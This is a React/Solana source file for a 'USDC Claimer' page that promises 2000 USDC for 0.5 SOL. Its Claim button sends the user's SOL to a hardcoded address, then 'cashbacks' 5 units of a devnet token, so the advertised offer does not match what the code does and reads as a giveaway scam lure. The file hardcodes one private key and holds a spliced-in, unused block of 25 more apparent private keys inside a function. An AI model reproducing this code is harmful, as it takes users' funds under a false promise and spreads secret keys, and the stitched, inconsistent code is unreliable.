/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "QgqXpDdQUY37H9sXKKgZz2RnMLfSEcxag8GUZgeHPfrHMhERPmCq1juvPwYzARbD4MKPDaqomGW9Q9NFYoab4xx"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5Xv4sW1v1j3ZoY7Y6B9WfPxkigRthHEPY5jFPDUvJVMKJPeqQZFuhkegVbmiJ3cDs2h5tLwX63eyA2X2EDP6J4Q3",
  "key1": "5sfm8ZNFCb8uPnMRm6zLf5GTjNqNYbyPhvfVKBZXxkefUsknjhNuAsrju495S6YVxGW7HjWrw67jPy7XaYP6Uirq",
  "key2": "vSDrV3Fw2qgNw6iYuWebUbkjWT8TjWMUMadNxGKz98sn4LoMZ9FMPxJvMB9y3tACsLrhFzFESrMHGnGYkpc9SXU",
  "key3": "D5ocQphyQvxF9LUfbLUqLrdLwHBpBWYN9aXZsf9NcjjmKwAt6WmKWSESkDZdPhBQvFHSyYNDehHsu6KLitGkrRW",
  "key4": "2RXR9j977qADknRnWz6Gs3ThMnZKU8ZrxnoxVSCvY1Ys7JusPA8zrY6aiTKuiW16NEmS87JpVviLZ4sygNoVa394",
  "key5": "3reb9euUSyG5dyQiBxxE2jcxw6r7cq5C6xHEzT7ajvkc98pVo36r4mjaUBjD1KgvfMbkRnrmNinZSU3iQyX2YZu",
  "key6": "4TGxvJVaWKyDeHKGcbCuEvTQkfXU2afgtKzTET44xp7PTGaNSMFCbiXsPsfi99oXMJkmTuUD3SUM58FXCUV8nrJE",
  "key7": "5rCyCDiXgPR8LCiHuXp9tSZsHuZmdUAJwvfFKGS7S6BCPZBpUrJZUQncmKREqkN8kQ4svTLKvqUWRLdihVCZxEaS",
  "key8": "3YaQMJ8CdwmAjRa1ewXxaMQSPUtfkaxR8UwX1pWGLgTHuLvxhbAojJwRbQ2d2JZfDKZwJGL3AyK1WBmWjR981BwH",
  "key9": "46S9qzcETWHEJDRWJXzLDfpFUG9ZYGefenkz9jLQq9qunXKg73Y1qKQdxk384BAb59oqW5WWemNv7NYSYXrutfBj",
  "key10": "3xrWSPrBxLnRPY2KPKcngLcnsd7k4YTrMKSCiXZ4PtpETE594pbeSUTzq7x47FKxmcSBpmBBW65zbacShjXQq94t",
  "key11": "64Eckga4NAszQZakfmswtb9SNM8sYrAMHZeFNVYL9d4UyEG7iUuVTBogPUGSqjcaB38YhjVzP3Xwpnh9Nn5QBfjG",
  "key12": "3RUtt2DpWisCXa7MNoTvw1X7J2H7UVADFmVns8YtmCSueoF19oxskG8qvxrHqbACf16LhhG8arwCvp6wVJYwVY1",
  "key13": "KWvvWu2yPxTbPSZhAnzy1h5wPXtLpEwrsPfR9xmpBW539zXfLp1cUQi6LZKyZwX1iRUGeoLHviiuUdFVPuTkyVp",
  "key14": "5f5HueXc33GyRVZdkPzQZX2VkzdqmMoXuhd8xvXsq6mFFbiTb39cp9jJoPxSuSSHps8SBRK2d1UY7fAqbHw6s746",
  "key15": "39DNgJxasyiiGkdeNgFMe8dAyZkLSbpG152PaXRiiJyNLPr8RNEG6sy6s95fJfLjLnWsfNb9Pjkw5rT6K1j4F1Ea",
  "key16": "45MyTSm8z1GWuuJY4XpBw63QvNRo6HhVJEEVSPN5AWsrFPvJQi9t2rarvfNHnoBwvsFAsrryDmHJg9QoZC2SWQsu",
  "key17": "46e1uoKLkGCC8WE7LJYb4STSn258EJdqks2xRbHHr9xS4hvfVey5qXDpDugQ2ep1xYkjiVPxMr744ytxXZ7xmTVn",
  "key18": "4eiK7riCNkoMNpeUvCVHkav8ZHHxjHFwdqaoaQDc1eMDMmMiHCE5GVLDAdnYg5pmi6SgeBFwgwNBFAkcyku82E8S",
  "key19": "gtT74qWZuNVxfTBVyFpDHL4jML498rTysM8f4sDXEHpA8SoCTuxjdLPJkPbjCoPTfLzC9HUT8BCgtiYVpoX19mX",
  "key20": "43AaR5rrn6f3wd99iiXMe3vtpMG3mVzGBHUqCPrrvoeVfNazNYs8fNMoynXVZaZiySKF9enDe6YBwBDqXhs3qkQS",
  "key21": "2XSWhPK8tEw296ZYKumznHWkeNAhjxDfDpfsPC4MbX3om8C8gVfJSZZziiTwxbmWdWhRHmGd3RpRFQDeK2i2gJAJ",
  "key22": "3pfZEVo1wvWrn7NPDKbvofDpjZj1HFg2nGY2cEW2ZyNfDbFQD3pSmxu7VRCHQ2F7MyuMh1MS7vrYTzcTrQY2KPLf",
  "key23": "5exVJ8U4XmWZf9UsiVtw12ZGmKQ6rpqL4Rfxads6akRrtpWXQRyVMLb45cDWXDWMe6x9cwHoxxWRbWHj9nkVvoeh",
  "key24": "43DEviSPKsbhA3ZgWTo99sPDGpQXaZYZ1vx8u7iDuRvx9f4Aa3BEY99JHfKetNrgtdFa7ss1T6R8FgzHQp3c4FdM"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
